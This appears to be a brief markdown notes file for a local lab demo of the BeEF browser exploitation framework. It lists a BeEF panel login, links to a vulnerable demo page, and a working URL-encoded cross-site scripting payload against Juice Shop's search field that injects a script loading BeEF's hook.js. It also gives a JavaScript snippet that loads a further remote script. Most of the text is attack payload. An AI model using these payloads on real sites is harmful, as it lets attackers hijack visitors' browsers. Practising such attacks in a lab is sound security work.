# 
## BeEF panel
[http://beef.local:3000/ui/panel](http://beef.local:3000/ui/panel)
- user: beefadmin
- password: difficultpassword

## auto exploit (simple form)

[http://vulnerable.local:3000/demos/basic.html](http://vulnerable.local:3000/demos/basic.html)

## manual exploit (Juice Shop)

[http://vulnerable.local:3500/#/search?q=%3Cimg%20width%3D0%20height%3D0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple](http://vulnerable.local:3500/#/search?q=%3Cimg%20width%3D0%20height%3D0%20%20src%3Da%20onerror%3Deval(%60a%3Ddocument.createElement('script');a.type%3D'text%2Fjavascript';a.src%3D'http:%2F%2Fbeef.local:3000%2Fhook.js';document.body.appendChild(a);%60)%3Eapple)

```
var b = document.createElement('script');
b.type = 'text/javascript';
b.src = 'http://localhost:8088/shake.js';
document.body.appendChild(b);
```
